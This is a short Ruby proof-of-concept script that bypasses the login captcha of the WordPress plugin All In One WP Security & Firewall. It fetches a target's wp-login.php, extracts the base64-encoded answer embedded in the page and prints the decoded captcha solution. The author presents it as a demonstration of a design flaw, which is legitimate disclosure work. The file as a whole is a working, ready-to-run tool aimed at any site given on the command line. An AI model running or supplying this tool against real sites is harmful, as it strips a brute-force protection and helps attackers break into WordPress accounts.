#!/usr/bin/env ruby
# Kent 'picat' Gruber
# Rudimentary Ruby Script to:
# Solve the Wordpress plugin All In One WP Security & Firewall Login Captcha

# Proof of concept that word mapping twenty numbers and 
# base64 encoding the answer into the login page html is a bad idea.

require 'nokogiri'
require 'open-uri'
require 'base64'

# Formatting a colors are nice and easy. 
class String
	def colorize(text, color_code)  "#{color_code}#{text}\e[0m" end
	def green; colorize(self, "\e[1m\e[32m"); end	
	def red; colorize(self, "\e[1m\e[31m"); end
	def bold; colorize(self, "\e[1m"); end
end

def help_menu 
	puts "Wordpress AIOWPS Login Captcha Cracker".bold
	puts "-h \tHELP MENU"
	puts "\tDisplay this very menu.\n"
	puts "Useage:".bold
	puts "ruby #{__FILE__} http://www.target-url.com/wp-login.php"
end

# Handle user input with two simple arguments. 
# Check if empty.
if ARGV.empty?
	puts "[ Failed! ]".red + " No url or arguments passed."
	puts "-h for help"
	exit
# Check if user wants help menu.
elsif ( ARGV[0].include? "-h" || "-H" )
	help_menu
	exit
# Handle input as usual. 
else 
	# store input as url
	url = ARGV[0].dup

	# if the url dosen't include this, we'll add it
	unless ( ARGV[0].include? "http://www." || "https://www." )
		url.prepend("http://www.")		
	end

	# if the url dosen't include the wordpress login bit
	unless ( ARGV[0].include? "/wp-login.php")
		url << "/wp-login.php"
	end
end

begin 
# start working the hte data, parse the html
data = Nokogiri::HTML(open(url)) 

encoded_data = data.xpath('//*[@id="aiowps-captcha-string-info"]')

# split the html elements up
relevant = encoded_data.to_s.split

# 4th one is the one that contain the encoded string
encoded_answer = relevant[4].gsub( /value="/,"" ).gsub( /=">/,"" ) 

# decode from the encoded answer
decoded_answer = Base64.decode64(encoded_answer)

# grab the captcha answer as string first
captcha_answer = decoded_answer.split(//).last(2).join.to_s

# if valid number for captcha answer, checked via regex 
def valid_number?(num)
  /^\d{2}$/ === num
end

# check if the first captcha_answer grabbed is a valid number or not
unless valid_number?(captcha_answer)
	# if not valid number, only grab last char which will be a number always 
	captcha_answer = decoded_answer.split(//).last(1).join.to_i
else
	# if valid, grab last two, but store as int because why not
	captcha_answer = decoded_answer.split(//).last(2).join.to_i
end

# print stuff to screen
puts "Wordpress AIOWPS Login Captcha Cracker".bold
puts "Encoded Answer: #{encoded_answer}"
puts "Decoded Answer: #{decoded_answer}"
puts "Captcha Answer:" + " #{captcha_answer}".green
rescue 
	puts "[ Failed! ]".red + " Something went wrong while trying to reach #{url}"
end
